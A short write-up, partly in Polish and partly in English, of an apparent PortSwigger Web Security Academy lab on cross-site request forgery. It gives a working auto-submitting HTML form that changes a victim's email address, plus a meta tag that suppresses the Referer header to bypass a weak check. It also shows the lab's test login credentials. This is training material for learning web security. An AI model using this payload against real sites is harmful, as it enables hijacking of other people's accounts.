This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter


1. Wchodzimy w zadanie i uruchamiamy burpa, logujemy się danymi podanymi w zadaniu, włączamy intercepta i zmieniamy email, przechwycone połączenie wysyłamy do repetera i wyłączy intercepta
2. następnie kopijemy z repetera adres url i podmieniamy dane w tym skrypcie:
<form method="POST" action="https://0a7100f80454c49380878f63008600f9.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="testos@test.com">
    <input type="submit" value="submit request" />
</form>
<script>
        document.forms[0].submit();
</script>
i dodajemy na początku <meta name="referrer" content="never"> zapisujemy i dostarczamy ofierze


ENG:

1Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2Send the request to Burp Repeater and observe that if you change the domain in the Referer HTTP header then the request is rejected.
3Delete the Referer header entirely and observe that the request is now accepted.
4Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab. Include the following HTML to suppress the Referer header:
<meta name="referrer" content="no-referrer">
5Change the email address in your exploit so that it doesn't match your own.
6.Store the exploit, then click "Deliver to victim" to solve the lab.